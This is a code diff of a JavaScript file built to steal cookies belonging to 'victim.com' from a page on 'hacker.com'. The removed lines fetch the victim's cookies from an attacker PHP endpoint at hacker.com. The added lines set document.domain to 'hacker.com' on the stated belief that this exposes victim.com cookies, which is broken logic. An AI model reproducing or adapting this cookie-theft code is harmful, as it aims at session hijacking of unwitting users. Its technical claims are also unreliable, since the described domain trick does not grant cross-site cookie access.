@@ -12,7 +12,7 @@ function setCookie(name, value, days) {
         date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
         expires = "; expires=" + date.toUTCString();
     }
-    document.cookie = name + "=" + (value || "") + expires + "; path=/; domain=hacker.com";
+    document.cookie = name + "=" + (value || "") + expires + "; path=/; domain=.hacker.com";
 }
 
 // Function to read all cookies
@@ -28,17 +28,10 @@ function readCookies() {
 
 // Function to read cookies from victim.com
 function readVictimCookies() {
-    var xhr = new XMLHttpRequest();
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-            var cookies = JSON.parse(xhr.responseText);
-            for (var cookieName in cookies) {
-                console.log('Cookie Name: ' + cookieName + ', Cookie Value: ' + cookies[cookieName]);
-            }
-        }
-    };
-    xhr.open('GET', 'http://hacker.com/read_victim_cookies.php', true);
-    xhr.send();
+    // Set the document domain to allow access to victim.com cookies
+    document.domain = 'hacker.com';
+    // Read cookies from victim.com
+    readCookies();
 }
 
 // Set a cookie when the page loads
